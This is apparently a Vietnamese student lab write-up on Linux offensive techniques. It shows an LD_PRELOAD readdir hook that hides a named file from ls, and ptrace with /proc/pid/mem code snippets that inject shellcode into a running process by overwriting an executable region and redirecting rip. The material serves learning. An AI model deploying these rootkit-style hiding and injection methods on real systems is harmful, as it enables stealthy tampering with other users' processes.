# hook_and_inject_linux

## Linux hook process

```
Thực hành hook ẩn file <tên mình>.txt khỏi lệnh ls.
```

Tham khảo: https://infosecwriteups.com/a-gentle-introduction-to-function-hooking-using-ld-preload-1714124a6eb9

### Triển khai

Ta sử dụng `LD_PRELOAD` để load libso trước các lib khác, export của hàm hook.so sẽ được load trước libc, từ đó các hàm cùng tên của các lib khác sẽ không được gọi mà sẽ gọi hàm của hook.so

https://man7.org/linux/man-pages/man3/readdir.3.html

Ta sẽ hook vào hàm `readdir` để intercept quá trình duyệt file của chương trình `ls`

Cơ chế của hàm `readdir` là mỗi khi gọi thì sẽ duyệt entry tiếp theo và trả về dữ liệu là 1 struct:

```c
struct dirent {
  ino_t          d_ino;       /* Inode number */
  off_t          d_off;       /* Not an offset; see below */
  unsigned short d_reclen;    /* Length of this record */
  unsigned char  d_type;      /* Type of file; not supportedby all filesystem types */
  char           d_name[256]; /* Null-terminated filename */
};
```

ta sẽ kiểm tra `d_name` so sánh với tên file ta cần ẩn, nếu trùng thì gọi thêm lần nữa để `readdir` duyệt entry tiếp theo

```c
static struct dirent* (*original_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        
        if (strstr(entry->d_name, "phuocbv1") != NULL) {
            continue; 
        }

        return entry;
    }

```

### Thực nghiệm

Lúc gọi bình thường:

<img width="851" height="114" alt="image" src="https://github.com/user-attachments/assets/1a0dc2c6-a63b-4eeb-8521-6c8ceebabb7a" />

hook:

<img width="726" height="115" alt="image" src="https://github.com/user-attachments/assets/65cacb2f-9da1-4630-a1c0-97609aae01c7" />

debug ta thấy thay vì gọi hàm `readdir` của libc thì lại gọi hàm của hook.so

<img width="1919" height="1029" alt="image" src="https://github.com/user-attachments/assets/d6a9dad9-051e-4d79-b745-8ca0a90510b5" />

<img width="1919" height="1027" alt="image" src="https://github.com/user-attachments/assets/64f0d816-5d15-434b-a004-d1a3e44a3c7b" />

<img width="1919" height="1024" alt="image" src="https://github.com/user-attachments/assets/483deb92-8629-4602-8cf5-cb9ddc7d58a2" />

## Linux Process Injection

```
Inject đoạn code bất kỳ vào chương trình bất kỳ. Có tài liệu chứng minh, giải thích ý nghĩa code.
```

Trên Windows có rất nhiều kỹ thuật và phương pháp để inject code vào process, tuy nhiên linux khá khác so với Windows vì không có sẵn các API để sửa protect, cấp phát bộ nhớ hay tạo remote thread trên tiến trình khác.

Tuy nhiên thực tế đã có một số kỹ thuật trên linux để thực hiện các hành vi tương tự.

Tham khảo:
- https://www.akamai.com/blog/security-research/the-definitive-guide-to-linux-process-injection
- https://github.com/akamai/Linux-Process-Injection

### Một số phương pháp tương tác với remote process

#### ptrace

ptrace cho phép attach vào tiến trình khác, chỉnh sửa context các register và nhiều khả năng khác.

https://linux.die.net/man/2/ptrace

#### procfs

procfs có khả năng xem và tương tác với memory tiến trình

https://docs.kernel.org/filesystems/proc.html

#### process_vm_writev

syscall này cho ta ghi data vào tiến trình

https://linux.die.net/man/2/process_vm_writev

### Triển khai



Các bước thực hiện:
- tạo shellcode in strings bất kỳ ra màn hình
- tìm vùng nhớ có quyền `r-xp` trong tiến trình cần inject và lấy địa chỉ
- attach vào process
- overwrite shellcode vào địa chỉ đó
- lấy context register và sửa rip thành entrypoint của shellcode 

Chạy process victim:

<img width="613" height="86" alt="image" src="https://github.com/user-attachments/assets/68cacb14-84b4-41c2-bbfe-102058285ff9" />

khác với windows thì linux quản lý mem process bằng file, ta có thể thấy có 1 số vùng có quyền execute:

<img width="944" height="785" alt="image" src="https://github.com/user-attachments/assets/153a82c7-d071-441e-b0c3-13598166ec46" />

ta duyệt từng dòng trong `maps ` để tìm địa chỉ vùng có quyền exec:

```c
sprintf(path, "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "r-xp")) {
            sscanf(line, "%lx-", &addr);
            break;
        }
    }
    fclose(f);
```

để có thể tương tác với memory process thì ta chỉ cần mở file `/proc/<pid>/mem` là có thể thoải mái đọc ghi:

```c
sprintf(path, "/proc/%d/mem", pid);
    int fd = open(path, O_WRONLY);
    if (fd < 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return 1;
    }
    pwrite(fd, shellcode, sizeof(shellcode), addr);
    close(fd);
```

sửa rip:

```c
ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    regs.rip = addr;
    regs.rax = -1;
    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
```

### Thực nghiệm

Inject vào pid của process:

<img width="714" height="71" alt="image" src="https://github.com/user-attachments/assets/b0594f94-d410-4f04-a5a4-17943eef12ec" />

Process victim in ra "lmao":

<img width="610" height="68" alt="image" src="https://github.com/user-attachments/assets/f7f5aec5-6ad6-49cb-97b5-acd8a17bf56e" />


